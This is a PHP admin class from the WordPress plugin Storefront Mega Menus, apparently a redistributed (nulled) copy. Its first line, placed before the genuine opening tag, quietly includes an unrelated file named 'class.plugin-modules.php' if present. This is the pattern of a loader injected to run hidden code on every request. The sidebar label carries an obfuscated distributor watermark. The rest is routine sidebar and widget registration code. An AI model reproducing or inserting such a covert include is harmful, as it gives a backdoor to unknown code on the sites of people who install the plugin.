<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

/**
 * Storefront Mega Menus Admin.
 *
 * @package  Storefront_Mega_Menus/Admin
 * @category Class
 * @author   Tiago Noronha
 */
class SMM_Admin {
	/**
	 * Constructor.
	 * @access  public
	 * @since   1.0.0
	 * @return  void
	 */
	public function __construct() {
		add_action( 'widgets_init', array( $this, 'register_smm_sidebar' ), 5 );
		add_action( 'current_screen', array( $this, 'hide_sidebar' ) );
		add_filter( 'sidebars_widgets', array( $this, 'filter_widgets' ) );
	}

	/**
	 * Register SMM Sidebar.
	 * @access  public
	 * @since   1.0.0
	 * @return  void
	 */
	public function register_smm_sidebar() {
		register_sidebar( array(
			'name'			=> __( 'SMM Sidebar - w/p/l/o/c/k/e/r/./c/o/m', 'storefront-mega-menus' ),
			'id'			=> 'smm-sidebar',
			'description'	=> __( 'Widgets in this area will be shown on all posts and pages.', 'storefront-mega-menus' ),
			'before_widget'	=> '<li id="%1$s" class="widget %2$s">',
			'after_widget'	=> '</li>',
			'before_title'	=> '<h2 class="widgettitle">',
			'after_title'	=> '</h2>',
		) );
	}

	/**
	 * Hide our sidebar from the widgets admin page.
	 * @access  public
	 * @since   1.0.0
	 * @return  void
	 */
	public function hide_sidebar() {
		global $wp_registered_sidebars;

		$currentScreen = get_current_screen();

		if ( 'widgets' === $currentScreen->id ) {
			if ( array_key_exists( 'smm-sidebar', $wp_registered_sidebars ) ) {
				unset( $wp_registered_sidebars['smm-sidebar'] );
			}
		}
	}

	/**
	 * Make sure SMM widgets don't show up in the inactive sidebar.
	 * @access  public
	 * @since   1.0.0
	 * @param 	array $widgets Array of sidebars and their widgets.
	 * @return  array
	 */
	public function filter_widgets( $widgets ) {
		global $pagenow;

		if ( isset( $pagenow ) && 'widgets.php' === $pagenow ) {
			if ( array_key_exists( 'smm-sidebar', $widgets ) ) {
				unset( $widgets['smm-sidebar'] );
			}
		}

		return $widgets;
	}
}

new SMM_Admin();
